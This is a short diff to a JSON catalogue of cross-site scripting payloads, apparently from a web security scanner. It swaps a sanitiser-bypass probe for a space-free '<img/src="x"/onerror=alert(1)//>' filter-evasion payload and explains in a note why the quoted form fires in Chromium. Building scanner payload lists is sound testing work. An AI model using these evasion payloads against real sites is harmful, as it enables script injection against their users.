@@ -48,14 +48,15 @@
   },
   "payloads": [
     {
-      "id": "p173-probe",
+      "id": "nospace-img-001",
       "context": "html_element",
       "tags": [
-        "sanitizer_bypass"
+        "filter_evasion",
+        "nospace"
       ],
       "confidence": "high",
-      "payload": "<<script>Foo</script>iframe src=\"javascript:alert(1)\">",
-      "note": "Phase 173 control-experiment probe (non-recursive sanitiser bypass). TEMPORARY."
+      "payload": "<img/src=\"x\"/onerror=alert(1)//>",
+      "note": "Phase 333: replaces the TEMPORARY p173-probe (whose iframe-src-javascript shape is dead in modern Chromium -- never confirmable, verified by the Phase 331 instrumented run refusing it at this very slot). The quoted-src form survives space stripping and UTF-7 pages (no spaces): browser-measured dialog-fired and verifier-confirmed (Phase 332/333, dev/_p332_img_slash_probe.py). The UNQUOTED <img/src=x/onerror=...> form is inert -- the HTML5 tokenizer keeps / inside an unquoted attribute value, so the token lands in src, never in the handler."
     },
     {
       "id": "html-001",
